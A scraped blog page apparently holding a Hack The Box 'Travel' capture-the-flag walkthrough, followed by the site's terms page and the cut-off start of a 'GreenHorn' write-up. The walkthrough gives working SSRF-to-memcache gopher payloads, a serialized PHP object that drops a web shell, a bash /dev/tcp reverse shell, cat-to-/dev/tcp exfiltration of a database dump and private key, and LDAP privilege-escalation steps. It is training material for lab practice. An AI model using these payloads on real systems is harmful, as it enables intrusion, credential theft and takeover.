OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F= OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G% OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 8.774 days (since Tue Feb 18 22:59:32 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 289.20 ms 10.10.14.1 2 289.29 ms 10.10.10.189 Surprisingly there are three ports open with 433 being the unusal. Nmap scan reveals the domain name/host names. There are some interesting information that I stumbled upon while on the reconnaissance process I learnt about hello@travel.htb from the home page of port 80 There is some pretty good filter on the email subscribe field I found this j-query page, So I thought there could be api endpoints but there wasn\u0026rsquo;t any From port 443 I got these juicy information blog.travel.htb had a pretty good page and it\u0026rsquo;s made of wordpress. I ran wpscan against this website and found some interesting stuffs Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.17.6 | - X-Powered-By: PHP/7.3.16 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://blog.travel.htb/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blog.travel.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blog.travel.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4 identified (Insecure, released on 2020-03-31). | Found By: Rss Generator (Passive Detection) | - http://blog.travel.htb/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4\u0026lt;/generator\u0026gt; | - http://blog.travel.htb/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://blog.travel.htb/wp-content/themes/twentytwenty/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://blog.travel.htb/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; But there was nothing useful When I try to access blog-dev.travel.htb I get 403 but If I fuzz for directories I can see a exposed .git directory. Quickly I used git-dumper tool and from the dump I can see three files README.md,rss_template.php,template.php respectively The file README.md exposed some information # Rss Template Extension Allows rss-feeds to be shown on a custom wordpress page. ## Setup * `git clone https://github.com/WordPress/WordPress.git` * copy rss_template.php \u0026amp; template.php to `wp-content/themes/twentytwenty` * create logs directory in `wp-content/themes/twentytwenty` * create page in backend and choose rss_template.php as theme ## Changelog - temporarily disabled cache compression - added additional security checks - added caching - added rss template ## ToDo - finish logging implementation The file rss_template.php had this code: \u0026lt;?php /* Template Name: Awesome RSS */ include(\u0026#39;template.php\u0026#39;); get_header(); ?\u0026gt; \u0026lt;main class=\u0026#34;section-inner\u0026#34;\u0026gt; \u0026lt;?php function get_feed($url){ require_once ABSPATH . \u0026#39;/wp-includes/class-simplepie.php\u0026#39;;\t$simplepie = null;\t$data = url_get_contents($url); if ($url) { $simplepie = new SimplePie(); $simplepie-\u0026gt;set_cache_location(\u0026#39;memcache://127.0.0.1:11211/?timeout=60\u0026amp;prefix=xct_\u0026#39;); //$simplepie-\u0026gt;set_raw_data($data); $simplepie-\u0026gt;set_feed_url($url); $simplepie-\u0026gt;init(); $simplepie-\u0026gt;handle_content_type(); if ($simplepie-\u0026gt;error) { error_log($simplepie-\u0026gt;error); $simplepie = null; $failed = True; } } else { $failed = True; } return $simplepie; } $url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if(strpos($url, \u0026#34;custom_feed_url\u0026#34;) !== false){ $tmp = (explode(\u0026#34;=\u0026#34;, $url)); $url = end($tmp); } else { $url = \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34;; } $feed = get_feed($url); if ($feed-\u0026gt;error()) { echo \u0026#39;\u0026lt;div class=\u0026#34;sp_errors\u0026#34;\u0026gt;\u0026#39; . \u0026#34;\\r\\n\u0026#34;; echo \u0026#39;\u0026lt;p\u0026gt;\u0026#39; . htmlspecialchars($feed-\u0026gt;error()) . \u0026#34;\u0026lt;/p\u0026gt;\\r\\n\u0026#34;; echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39; . \u0026#34;\\r\\n\u0026#34;; } else { ?\u0026gt; \u0026lt;div class=\u0026#34;chunk focus\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;?php $link = $feed-\u0026gt;get_link(); $title = $feed-\u0026gt;get_title(); if ($link) { $title = \u0026#34;\u0026lt;a href=\u0026#39;$link\u0026#39; title=\u0026#39;$title\u0026#39;\u0026gt;$title\u0026lt;/a\u0026gt;\u0026#34;; } echo $title; ?\u0026gt; \u0026lt;/h3\u0026gt; \u0026lt;?php echo $feed-\u0026gt;get_description(); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php foreach($feed-\u0026gt;get_items() as $item): ?\u0026gt; \u0026lt;div class=\u0026#34;chunk\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;\u0026lt;?php if ($item-\u0026gt;get_permalink()) echo \u0026#39;\u0026lt;a href=\u0026#34;\u0026#39; . $item-\u0026gt;get_permalink() . \u0026#39;\u0026#34;\u0026gt;\u0026#39;; echo $item-\u0026gt;get_title(); if ($item-\u0026gt;get_permalink()) echo \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;; ?\u0026gt;\u0026amp;nbsp;\u0026lt;span class=\u0026#34;footnote\u0026#34;\u0026gt;\u0026lt;?php echo $item-\u0026gt;get_date(\u0026#39;j M Y, g:i a\u0026#39;); ?\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/h4\u0026gt; \u0026lt;?php echo $item-\u0026gt;get_content(); ?\u0026gt; \u0026lt;?php if ($enclosure = $item-\u0026gt;get_enclosure(0)) { echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;p\u0026gt;\u0026#39; . $enclosure-\u0026gt;embed(array( \u0026#39;audio\u0026#39; =\u0026gt; \u0026#39;./for_the_demo/place_audio.png\u0026#39;, \u0026#39;video\u0026#39; =\u0026gt; \u0026#39;./for_the_demo/place_video.png\u0026#39;, \u0026#39;mediaplayer\u0026#39; =\u0026gt; \u0026#39;./for_the_demo/mediaplayer.swf\u0026#39;, \u0026#39;altclass\u0026#39; =\u0026gt; \u0026#39;download\u0026#39; )) . \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; if ($enclosure-\u0026gt;get_link() \u0026amp;\u0026amp; $enclosure-\u0026gt;get_type()) { echo \u0026#39;\u0026lt;p class=\u0026#34;footnote\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt;(\u0026#39; . $enclosure-\u0026gt;get_type(); if ($enclosure-\u0026gt;get_size()) { echo \u0026#39;; \u0026#39; . $enclosure-\u0026gt;get_size() . \u0026#39; MB\u0026#39;; } echo \u0026#39;)\u0026lt;/p\u0026gt;\u0026#39;; } if ($enclosure-\u0026gt;get_thumbnail()) { echo \u0026#39;\u0026lt;div\u0026gt;\u0026lt;img src=\u0026#34;\u0026#39; . $enclosure-\u0026gt;get_thumbnail() . \u0026#39;\u0026#34; alt=\u0026#34;\u0026#34; /\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;; } echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;!-- DEBUG \u0026lt;?php if (isset($_GET[\u0026#39;debug\u0026#39;])){ include(\u0026#39;debug.php\u0026#39;); } ?\u0026gt; --\u0026gt; \u0026lt;?php get_template_part( \u0026#39;template-parts/footer-menus-widgets\u0026#39; ); ?\u0026gt; \u0026lt;?php get_footer(); Understanding Awesome RSS # rss_template.php is the source code for Awesome RSS which is from the web page blog.travel.htb This following code uses memcache for caching and with xct_ as prefix to the cached data. Definition Memcache module provides handy procedural and object-oriented interface to memcached, highly effective caching daemon, which was especially designed to decrease database load in dynamic web applications. The Memcache module also provides a session handler (memcache). More information about memcached can be found at » http://www.memcached.org/.\nif ($url) { $simplepie = new SimplePie(); $simplepie-\u0026gt;set_cache_location(\u0026#39;memcache://127.0.0.1:11211/?timeout=60\u0026amp;prefix=xct_\u0026#39;); This function get_feed gets the URL for feed. $url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if(strpos($url, \u0026#34;custom_feed_url\u0026#34;) !== false){ $tmp = (explode(\u0026#34;=\u0026#34;, $url)); $url = end($tmp); } else { $url = \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34;; } $feed = get_feed($url); customefeed.xml has the data in xml format, and the contents match Awesome RSS Again this code function requests query string custom_feed_url for customfeed.xml $url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if(strpos($url, \u0026#34;custom_feed_url\u0026#34;) !== false){ $tmp = (explode(\u0026#34;=\u0026#34;, $url)); $url = end($tmp); } else { $url = \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34;; } If the condition satisfies then it splits the URL by '=' with using explode function like this awesome-rss/?custom_feed_url=QUERY_STRING. Else it will simply sets the url to http://www.travel.htb/newsfeed/customfeed.xml So let\u0026rsquo;s test this by making the URL to look like this: http://blog.travel.htb/awesome-rss?custom_feed_url\u0026amp;rss=http://10.10.14.16/rss I opened a netcat like this nc -lnvp 3888 listener and sent a curl request with the above URL Got a hit on my listener, I can see it in the logs. This confirms the SSRF vulnerability here At end of the source code I can see a code for debug page. But It\u0026rsquo;s within the html comments \u0026lt;!-- DEBUG \u0026lt;?php if (isset($_GET[\u0026#39;debug\u0026#39;])){ include(\u0026#39;debug.php\u0026#39;); } ?\u0026gt; --\u0026gt; There isn\u0026rsquo;t any difference, on visiting debug.php it just returns the same page But from the source code I can see the contents. At first it was empty but on refreshing the page it showed me the cached value I can view the commented value using the diff command in my terminal diff \u0026lt;(curl -s \u0026#39;http://blog.travel.htb/awesome-rss/?debug\u0026#39;) \u0026lt;(curl -s http://blog.travel.htb/awesome-rss/) First try Second try This is the content from template.php \u0026lt;?php /** Todo: finish logging implementation via TemplateHelper */ function safe($url) { // this should be secure $tmpUrl = urldecode($url); if(strpos($tmpUrl, \u0026#34;file://\u0026#34;) !== false or strpos($tmpUrl, \u0026#34;@\u0026#34;) !== false) {\tdie(\u0026#34;\u0026lt;h2\u0026gt;Hacking attempt prevented (LFI). Event has been logged.\u0026lt;/h2\u0026gt;\u0026#34;); } if(strpos($tmpUrl, \u0026#34;-o\u0026#34;) !== false or strpos($tmpUrl, \u0026#34;-F\u0026#34;) !== false) {\tdie(\u0026#34;\u0026lt;h2\u0026gt;Hacking attempt prevented (Command Injection). Event has been logged.\u0026lt;/h2\u0026gt;\u0026#34;); } $tmp = parse_url($url, PHP_URL_HOST); // preventing all localhost access if($tmp == \u0026#34;localhost\u0026#34; or $tmp == \u0026#34;127.0.0.1\u0026#34;) {\tdie(\u0026#34;\u0026lt;h2\u0026gt;Hacking attempt prevented (Internal SSRF). Event has been logged.\u0026lt;/h2\u0026gt;\u0026#34;);\t} return $url; } function url_get_contents ($url) { $url = safe($url); $url = escapeshellarg($url); $pl = \u0026#34;curl \u0026#34;.$url; $output = shell_exec($pl); return $output; } class TemplateHelper { private $file; private $data; public function __construct(string $file, string $data) { $this-\u0026gt;init($file, $data); } public function __wakeup() { $this-\u0026gt;init($this-\u0026gt;file, $this-\u0026gt;data); } private function init(string $file, string $data) { $this-\u0026gt;file = $file; $this-\u0026gt;data = $data; file_put_contents(__DIR__.\u0026#39;/logs/\u0026#39;.$this-\u0026gt;file, $this-\u0026gt;data); } } template.php primarily has the code for security mechanisms to secure custom_feed_url The code mainly checks for: file:// or @ \u0026mdash;\u0026gt; Local file Inclusion attacks -o or -F \u0026mdash;\u0026gt; Command Injection localhost or 127.0.0.1 \u0026mdash;\u0026gt; Server Side Request Forgery If the above conditions are satisfied then the PHP code exits and records attempts to /logs/ There is an workaround for this, I can use Gopher protocol instead of http with decimal representation of local host. Definition Gopher is a protocol. It was designed for distributing, searching, and retrieving documents over the Internet. Gopher represented an early alternative to the World Wide Web. The gopher protocol has some things HTTP-based clients do not have. It is based on menus. An item selected from a menu will either open another menu, or a document.\nThe bottom line is, Gopher is a very old protocol that used before http and delivers the message without any useless headers. Testing with Gopher # I can test gopher like this curl -s \u0026#39;gopher://10.10.14.16:6001//testing\u0026#39; I can see that gopher successfully transfers the message without any Headers Now that I tested gopher for the memcache , I saved a local copy of customfeed.xml as sec.xml I opened a python http server and I requested for the file that I made, using SSRF that I discovered earlier curl -s http://blog.travel.htb/awesome-rss/\\?custom_feed_url=http://10.10.14.16:8000/sec.xml Actually It saved the file that I made as some data into it\u0026rsquo;s cache. Now I can see two data values This definitely could be a hash generated value. Understanding Memcache # Next I called for the local host using Gopher protocol Gopherus is a tool that generates SSRF payloads using gopher protocol. For testing I gave exploitEmp5r0R as a payload value As I already know about the filters for custom_feed_url to bypass the them I can replace the localhost with it\u0026rsquo;s decimal representation which is 2130706433 . Hex value is also applicable Now the payload becomes http://blog.travel.htb/awesome-rss/\\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a Sent it using curl curl -s http://blog.travel.htb/awesome-rss/\\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a With debug I can see that it actually worked As this is a MD5 generated hash, I could also recreate it. This cache stores md5 hash of customfeed.xml with including the whole URL echo -n \u0026#34;http://www.travel.htb/newsfeed/customfeed.xml\u0026#34; | md5sum The Memcached get\u0026rsquo;s md5 sum of something with using the key spc. I learnt about this while googling memcache. I could see the whole source code on the internet as memcache is opensource. Now lets make another with the new found key spc echo -n \u0026#34;3903a76d1e6fef0d76e973a0561cbfc0:spc\u0026#34; | md5sum I can see this hash value matches to the value from debug Exploitation # I can generate the serialized object by tweaking template.php code a little by injecting a malicious payload Crafting the payload # \u0026lt;?php class TemplateHelper { public $file; public $data; public function __construct(string $file, string $data) { $this-\u0026gt;init($file, $data); } private function init(string $file, string $data) { $this-\u0026gt;file = $file; $this-\u0026gt;data = $data; file_put_contents(__DIR__.\u0026#39;/logs/\u0026#39;.$this-\u0026gt;file, $this-\u0026gt;data); } } $pwn = new TemplateHelper(\u0026#34;shell.php\u0026#34;, \u0026#34;\u0026lt;?php system(\\$_GET[emperor]); ?\u0026gt;\u0026#34;); echo serialize($pwn); ?\u0026gt; This code will generate a serialized object for the malicious payload which on using will be saved as shell.php within the logs folder. Actually on running the php code locally I can watch the process. But first let me create a directory called logs php exploit.php Now I can see the payload within the logs folder that I created Now I fed the serialized data generated by the php script to gopherus This was the output I got from gopherus tool gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a Now I replaced bunch of things in the payload given by Gopherus First I replaced localhost to it\u0026rsquo;s decimal representation which is 2130706433 Second I replaced SpyD3r to the hash we generated earlier also by including the prefix which is xct_4e5612ba079c530a6b1f148c0b352241 The final payload would be http://blog.travel.htb/awesome-rss/\\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a Sent it using curl On visiting http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id I could access shell.php This worked very nicely To get a reverse shell lets change the id command with url encoded bash payload which would be bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27 The final URL for reverse shell would be http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?emperor=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27 I got the reverse shell connection on my listener I performed some shell up gradation /usr/bin/script -qc /bin/bash /dev/null Then for clear command export TERM=xterm Press CTRL+Z Then after stty raw -echo; fg Atlast stty rows 38 columns 116 Pivoting # While enumerating I found the directory /opt/wordpress which had a sql database file So I transferred the file like this to my netcat listener cat backup-13-04-2020.sql \u0026gt; /dev/tcp/10.10.14.16/8001 If I search for admin using grep I can get two hashes Only one hash could be cracked. Which is the hash for user lynik-admin hashcat hashes /usr/share/wordlists/rockyou.txt Now I have ssh access for user lynik-admin Got the User flag Breaking the fourthwall \u0026ndash;\u0026gt; I can see what you are thinking Privilege Escalation # In the home directory of lynik-admin , I can see a hidden file .ldaprc. Which is particularly interesting, This article says that the file ldaprc holds the configuration for LDAP clients. The file contents are:- I enumerated the domain with some basic commands There was another interesting file hidden within the home directory which is .viminfo Basically .viminfo file will hold serialized data of any modifications done through vim editor. Contents of .viminfo: # This viminfo file was generated by Vim 8.1. # You may edit it if you\u0026#39;re careful! # Viminfo version |1,4 # Value of \u0026#39;encoding\u0026#39; when this file was written *encoding=utf-8 # hlsearch on (H) or off (h): ~h # Command Line History (newest to oldest): :wq! |2,0,1587670530,,\u0026#34;wq!\u0026#34; # Search String History (newest to oldest): # Expression History (newest to oldest): # Input Line History (newest to oldest): # Debug Line History (newest to oldest): # Registers: \u0026#34;\u0026#34;1\tLINE\t0 BINDPW \u0026lt;SNIP\u0026gt; |3,1,1,1,1,0,1587670528,\u0026#34;BINDPW \u0026lt;SNIP\u0026gt;\u0026#34; # File marks: \u0026#39;0 3 0 ~/.ldaprc |4,48,3,0,1587670530,\u0026#34;~/.ldaprc\u0026#34; # Jumplist (newest first): -\u0026#39; 3 0 ~/.ldaprc |4,39,3,0,1587670530,\u0026#34;~/.ldaprc\u0026#34; -\u0026#39; 1 0 ~/.ldaprc |4,39,1,0,1587670527,\u0026#34;~/.ldaprc\u0026#34; # History of marks within files (newest to oldest): \u0026gt; ~/.ldaprc *\t1587670529\t0 \u0026#34;\t3\t0 .\t4\t0 +\t4\t0 There was a word which looked like a password so I redacted that particular data and gave you the contents Usually the LDAP listens on port 389. We can do a quick bash scan to confirm that for port in {1..65535}; do echo \u0026gt; /dev/tcp/172.20.0.10/$port \u0026amp;\u0026amp; echo \u0026#34;$port open\u0026#34;; done 2\u0026gt;/dev/null Actually there is another port open which is 639 along with 389 First lemme forward the port 389 to my system. ssh -L 389:172.20.0.10:389 lynik-admin@travel.htb The password from .viminfo actually worked here ldapsearch -H ldap://127.0.0.1 -w \u0026lt;SNIP\u0026gt; -b \u0026#34;DC=travel,DC=htb\u0026#34; -D \u0026#39;CN=lynik-admin,DC=travel,dc=htb\u0026#39; This user actually a admin to LDAP which will help a lot The PAM configuration for su reveals something. Location of the file: /etc/pam.d/su # # The PAM configuration file for the Shadow `su\u0026#39; service # # This allows root to su without passwords (normal operation) auth sufficient pam_rootok.so # Uncomment this to force users to be a member of group root # before they can use `su\u0026#39;. You can also add \u0026#34;group=foo\u0026#34; # to the end of this line if you want to use a group other # than the default \u0026#34;root\u0026#34; (but this may have side effect of # denying \u0026#34;root\u0026#34; user, unless she\u0026#39;s a member of \u0026#34;foo\u0026#34; or explicitly # permitted earlier by e.g. \u0026#34;sufficient pam_rootok.so\u0026#34;). # (Replaces the `SU_WHEEL_ONLY\u0026#39; option from login.defs) auth required pam_wheel.so # Uncomment this if you want wheel members to be able to # su without a password. # auth sufficient pam_wheel.so trust # Uncomment this if you want members of a specific group to not # be allowed to use su at all. # auth required pam_wheel.so deny group=nosu # Uncomment and edit /etc/security/time.conf if you need to set # time restrainst on su usage. # (Replaces the `PORTTIME_CHECKS_ENAB\u0026#39; option from login.defs # as well as /etc/porttime) # account requisite pam_time.so # This module parses environment configuration file(s) # and also allows you to use an extended config # file /etc/security/pam_env.conf. # # parsing /etc/environment needs \u0026#34;readenv=1\u0026#34; session required pam_env.so readenv=1 # locale variables are also kept into /etc/default/locale in etch # reading this file *in addition to /etc/environment* does not hurt session required pam_env.so readenv=1 envfile=/etc/default/locale # Defines the MAIL environment variable # However, userdel also needs MAIL_DIR and MAIL_FILE variables # in /etc/login.defs to make sure that removing a user # also removes the user\u0026#39;s mail spool file. # See comments in /etc/login.defs # # \u0026#34;nopen\u0026#34; stands to avoid reporting new mail when su\u0026#39;ing to another user session optional pam_mail.so nopen # Sets up user limits according to /etc/security/limits.conf # (Replaces the use of /etc/limits in old login) session required pam_limits.so # The standard Unix authentication modules, used with # NIS (man nsswitch) as well as normal /etc/passwd and # /etc/shadow entries. @include common-auth @include common-account @include common-session Before moving onto next, make a LDAP connection with Apache Directory Studio to make any process easy The configuration allows only the members of wheel group to switch to other users. Attempts to SSH as this user also fail, as the server denies password-based authentication. The ssh configuration file also gives us more details regarding this. (Ref: /etc/ssh/ssh_config and /etc/ssh/sshd_config) The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute on LDAP Lets try changing the password for user lynik to password of our choice Click on new Attribute and type userPassword then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish. I can see the commands used in the background for this, below. To login as user lynik I have to put the public key to the system via LDAP Now to login using ssh I created keys using ssh-keygen and then copied the public key. In Apache directory studio create new attribute objectClass and the click finish Then on the prompt select ldapPublickey, click finish after selecting it. Create another attribute sshPublickey then on the prompt click \u0026quot;edit as text\u0026quot;, after paste the public key. Click finish. Transferred the private key to my system. cat id_rsa \u0026gt; /dev/tcp/10.10.14.16/8001 After giving all the necessary permissions, used the private key to login as user lynik I can see user lynik group is in 5000 I can actually change the group to root\u0026rsquo;s group. But first I have to find the UID for root group cat /etc/group | grep -i sudo Found root group to be 27 so changed the group ID to 27 in the LDAP. After re-login I can see the changes Got the Root flag Summary # This walkthrough details the full compromise of travel.htb, a Linux-based target. Reconnaissance revealed open ports (22, 80, 443), a WordPress site (blog.travel.htb), and an exposed .git directory. Enumeration uncovered an outdated WordPress 5.4 installation with XML-RPC enabled and a vulnerable rss_template.php file. Exploiting an SSRF vulnerability, cache poisoning in Memcached, and PHP object injection, a web shell was uploaded, leading to remote code execution. Pivoting further, a MySQL database dump exposed credentials, and an .ldaprc file hinted at LDAP-based authentication. Using .viminfo, a stored password was retrieved, granting access to lynik-admin via SSH. By modifying LDAP attributes, the user’s group was changed to root (27), escalating privileges and leading to complete system takeover. This successful attack leveraged SSRF, cache poisoning, and LDAP misconfigurations to achieve root access and capture the final flag.\n","date":"28 March 2025","externalUrl":null,"permalink":"/posts/1742495331851-travel-walkthroughhtb/","section":"Posts","summary":"","title":"Travel Walkthrough(Hack The Box)","type":"posts"},{"content":" Content Sharing \u0026amp; Attribution # You are free to share, republish, or reference the content from Secure The Throne, as long as you:\nGive proper credit by mentioning Secure The Throne as the original source.\nProvide a clear link back to the original article on this site.\nDo not alter the content in a way that misrepresents the original meaning.\nTerms \u0026amp; Conditions # By accessing and using this site, you agree to the following terms:\nNo Legal or Professional Advice – The cybersecurity tips and insights shared here do not constitute professional security advice. Always consult a cybersecurity expert for specific concerns.\nNo Liability – We are not responsible for any consequences resulting from the use or misuse of the information provided. Cybersecurity practices should be implemented with caution.\nExternal Links – This site may contain links to third-party sites. We are not responsible for their content, accuracy, or security policies.\nChanges to Terms – These terms may be updated without notice. Continued use of the site implies acceptance of any modifications.\nDisclaimer - The information on this site is for educational and informational purposes only. We do not guarantee that the security practices mentioned will be 100% effective for every situation. We are not responsible for any issues arising from the use of the information provided.\nFor any inquiries regarding content usage or permissions, please contact us from any of the social links from the about page\n","date":"26 March 2025","externalUrl":null,"permalink":"/attribution-and-terms-of-use/","section":"Secure The Throne","summary":"","title":"Attribution \u0026 Terms of Use","type":"page"},{"content":" About # GreenHorn is an easy difficulty machine that takes advantage of an exploit in Pluck to achieve Remote Code Execution and then demonstrates the dangers of pixelated credentials. The machine also showcases that we must be careful when sharing open-source configurations to ensure that we do not reveal files containing passwords or other information that should be kept confidential.\nReconnaissance # I scanned the ports with rustscan and we have three ports open 80,22,3000 respectively as shown in the below image First I checked Port 80 and it runs a website called greenhorn. The noticeable thing is it had a loginpage. While poking around more I found that this greenhorn page uses Pluck CMS, which is sensitive as it goes. Definition Pluck is a small and simple content management system (CMS), written in PHP. With Pluck, you can easily manage your own website. Pluck focuses on simplicity and ease of use. This makes Pluck an excellent choice for every small website. Licensed under the General Public License (GPL), Pluck is completely open source. This allows you to do with the software whatever you want, as long as the software stays open source.\nOnto the next port 3000, It runs Gitea on it, Also it had repo of the greenhorn page from port 80 The crazy thing is I was able to access the repo without any form of authentication. Enumeration # As we got a exposed repo I was desperately searching for something sensitive, while on that login.php seemed Interesting. This login.php code performs some interesting functions like blocking users after five or some failed attempts. View the code \u0026lt;?php /* * This file is part of pluck, the easy content management system * Copyright (c) pluck team * http://www.pluck-cms.org * Pluck is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * See docs/COPYING for the complete license. */ //First, define that we are in pluck. define(\u0026#39;IN_PLUCK\u0026#39;, true); //Then start session support. session_start(); //Include security-enhancements. require_once \u0026#39;data/inc/security.php\u0026#39;; //Include functions. require_once \u0026#39;data/inc/functions.modules.php\u0026#39;; require_once \u0026#39;data/inc/functions.all.php\u0026#39;; //Include variables. require_once \u0026#39;data/inc/variables.all.php\u0026#39;; //Check if we\u0026#39;ve installed pluck. if (!file_exists(\u0026#39;data/settings/install.dat\u0026#39;)) { $titelkop = $lang[\u0026#39;install\u0026#39;][\u0026#39;not\u0026#39;]; include_once \u0026#39;data/inc/header2.php\u0026#39;; redirect(\u0026#39;install.php\u0026#39;, 3); show_error($lang[\u0026#39;install\u0026#39;][\u0026#39;not_message\u0026#39;], 1); include_once \u0026#39;data/inc/footer.php\u0026#39;; } //If pluck is installed: else { require_once \u0026#39;data/settings/pass.php\u0026#39;; //Check if we\u0026#39;re already logged in. First, get the token. require_once \u0026#39;data/settings/token.php\u0026#39;; if (isset($_SESSION[$token]) \u0026amp;\u0026amp; ($_SESSION[$token] == \u0026#39;pluck_loggedin\u0026#39;)) { header(\u0026#39;Location: admin.php\u0026#39;); exit; } //Include header-file. $titelkop = $lang[\u0026#39;login\u0026#39;][\u0026#39;title\u0026#39;]; include_once \u0026#39;data/inc/header2.php\u0026#39;; //If password has been sent, and the bogus input is empty, MD5-encrypt password. if (isset($_POST[\u0026#39;submit\u0026#39;]) \u0026amp;\u0026amp; empty($_POST[\u0026#39;bogus\u0026#39;])) { $pass = hash(\u0026#39;sha512\u0026#39;, $cont1); //Create hash from user-IP, for brute-force protection. define(\u0026#39;LOGIN_ATTEMPT_FILE\u0026#39;, \u0026#39;data/settings/loginattempt_\u0026#39;.hash(\u0026#39;sha512\u0026#39;, $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]).\u0026#39;.php\u0026#39;); //Check if user has tried to login before. if (file_exists(LOGIN_ATTEMPT_FILE)) { require(LOGIN_ATTEMPT_FILE); //Determine the amount of seconds that a user will be blocked (300 = 5 minutes). $timestamp = $timestamp + 300; //Block access if user has tried 5 times. if (($tries == 5)) { //Check if time hasn\u0026#39;t exceeded yet, then block user. if ($timestamp \u0026gt; time()) $login_error = show_error($lang[\u0026#39;login\u0026#39;][\u0026#39;too_many_attempts\u0026#39;], 1, true); //If time has exceeded, unblock user. else unlink(LOGIN_ATTEMPT_FILE); } } //If password is correct, save session-cookie. if (($pass == $ww) \u0026amp;\u0026amp; (!isset($login_error))) { $_SESSION[$token] = \u0026#39;pluck_loggedin\u0026#39;; //Delete loginattempt file, if it exists. if (file_exists(LOGIN_ATTEMPT_FILE)) unlink(LOGIN_ATTEMPT_FILE); //Display success message. show_error($lang[\u0026#39;login\u0026#39;][\u0026#39;correct\u0026#39;], 3); if 